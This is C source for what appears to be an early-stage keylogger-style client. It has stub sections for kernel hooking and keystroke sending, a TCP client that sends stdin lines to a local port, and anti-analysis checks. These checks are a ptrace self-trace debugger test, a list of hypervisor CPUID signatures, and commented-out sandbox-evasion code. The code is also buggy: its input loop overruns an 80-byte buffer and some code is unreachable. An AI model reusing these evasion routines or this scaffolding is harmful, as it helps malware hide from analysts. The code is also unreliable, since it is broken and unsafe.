#include <stdbool.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

#include <sys/types.h>
#include <sys/ptrace.h>

#define FALSE 0
#define TRUE  1
#define MAX_BUFFER_SIZE 80
#define PORT 8080
#define SOCK_ADDR struct sockaddr

bool checkDebugging();
bool checkVirtualEnvironment();
void displayMessage();
void endlessSort();
void stackSmash();

void interactWithServer(int serverClientBuffer);

int main(){
////////////////////////////////////////////////////////////////
// Check Environment
////////////////////////////////////////////////////////////////

    // Create some random number
    int randomNum = 0;

    if (checkDebugging() || checkVirtualEnvironment()){
        printf("Debugging or Virtual Environment");
        exit(0);

        if (randomNum % 2 == 0){
            endlessSort();
        }else{
            stackSmash();
        }
    }

////////////////////////////////////////////////////////////////
// Create Connection
////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////
// Hook Kernel
////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////
// Send Keystroke
////////////////////////////////////////////////////////////////

    int serverClientBuffer, connfd;
    struct sockaddr_in servaddr, cli;

    // socket create and verification
    serverClientBuffer = socket(AF_INET, SOCK_STREAM, 0);
    if (serverClientBuffer == -1) {
        printf("socket creation failed...\n");
        exit(0);
    }
    else{
        printf("Socket successfully created..\n");
    }

    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket
    if (connect(serverClientBuffer, (SOCK_ADDR*)&servaddr, sizeof(servaddr)) != 0){
        printf("connection with the server failed...\n");
        exit(0);
    }
    else{
        printf("connected to the server..\n");
    }

    // Begin client server interaction
    interactWithServer(serverClientBuffer);

    // Close the socket
    close(serverClientBuffer);
}

void interactWithServer(int serverClientBuffer){
// Reads from stdin and writes to buffer
// INPUT: serverClientBuffer, used to write to EAX specific socket

    char buffer[MAX_BUFFER_SIZE];
    int bufferIndex;

    // Infinite loop
    while (1){
        // Clear buffer
        bzero(buffer, sizeof(buffer));
        printf("Enter the string : ");

        // Set index
        bufferIndex = 0;

        // Read all chars from stdin until newline
        while ((buffer[bufferIndex++] = getchar()) != '\n');

        // Write buffer into serverClientBuffer
        write(serverClientBuffer, buffer, sizeof(buffer));
        // Clear buffer
        bzero(buffer, sizeof(buffer));
        // Read serverClientBuffer into buffer
        read(serverClientBuffer, buffer, sizeof(buffer));
        printf("From Server : %s", buffer);

        if ((strncmp(buffer, "exit", 4)) == 0){
            printf("Client Exit...\n");
            break;
        }
    }
}

bool checkDebugging(){
// Check if Adoclient is being debugged
// OUTPUT: 1 if true, else 0

    bool result = FALSE;

    // Process attempts to trace itself
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){
        result = TRUE;
    }else{
        ptrace(PTRACE_DETACH, 0, 1, 0);
    }

    return result;
}

bool checkVirtualEnvironment(){
// Check if Adoclient is running in virtual environment
// OUTPUT: 1 if true, else 0

// Known VM vendor names/signatures
// "bhyve bhyve "  – bhyve
// 0x626879766520626879766520

// "KVMKVMKVM   "    – KVM
// 0x4B564D4B564D4B564D202020

// "TCGTCGTCGTCG" – QEMU
// 0x544347544347544347544347

// "Microsoft Hv" – Microsoft Hyper-V or Windows Virtual PC
// 0x4D6963726F736F6674204876

// "lrpepyh  vr "  – Parallels (it possibly could be "prl hyperv ")
// 0x6C7270657079682020767220

// "VMwareVMware" – VMware
// 0x564D77617265564D77617265

// "XenVMMXenVMM" – Xen HVM
// 0x58656E564D4D58656E564D4D

// "ACRNACRNACRN" – Project ACRN
// 0x4143524E4143524E4143524E

// "QNXQVMBSQG  "   – QNX Hypervisor
// 0x514E5851564D425351472020

// "GenuineIntel" – Apple Rosetta 2[7]
// 0x47656E75696E65496E74656C

    bool result = FALSE;

    // Ask user for interaction
    // int response = MessageBox(0, "Do you want to restart your computer now?",
    //                           "Restart required", MB_OK);
    // if (response == IDYES) return FALSE;

    displayMessage();

    // Wait for mouse to move
    // POINT currentMousePosition;
    // POINT previousMousePosition;
    // GetCursorPos(&previousMousePosition);
    // double mouseDistance = 0;
    // while (TRUE)
    // {
    //     GetCursorPos(&currentMousePosition);
    //     mouseDistance += sqrt(
    //         pow(currentMousePosition.x - previousMousePosition.x, 2) +
    //         pow(currentMousePosition.y - previousMousePosition.y, 2)
    //     );
    //     Sleep(100);
    //     previousMousePosition = currentMousePosition;
    //     if (mouseDistance > 20000) break;
    // }

    // int infoType = 0, a = 0, b = 0, c = 0, d = 0;

    // infoType = 0;
    // __asm__(
    // "cpuid"
    // : "=a" (a), "=b" (b), "=c" (c), "=d" (d) // The output variables. EAX -> a and so on..
    // : "0" (infoType)                         // Put the infoType into EAX
    // );
    // printf ("infoType %x\nEAX: %x\nEBX: %x\nECX: %x\nEDX: %x\n", infoType, a, b, c, d);
    // printf ("VM?: %08x%08x%08x\n", b, d, c);

    // infoType = 1;
    // __asm__(
    // "cpuid"
    // : "=a" (a), "=b" (b), "=c" (c), "=d" (d) // The output variables. EAX -> a and so on..
    // : "0" (infoType)                         // Put the infoType into EAX
    // );
    // printf ("infoType %x\nEAX: %x\nEBX: %x\nECX: %x\nEDX: %x\n", infoType, a, b, c, d);
    // printf ("VM?: %08x%08x%08x\n", b, d, c);

    // Get 31st bit of ECX
    // c = c << ;

    // if (c == 1){
    //     printf("Virtual Environment detected.\n");
    //     exit(0);
    // }

    return result;
}

void endlessSort(){
// 

}

void stackSmash(){
// 

}

void displayMessage(){
    system("xmessage -center ''");
}
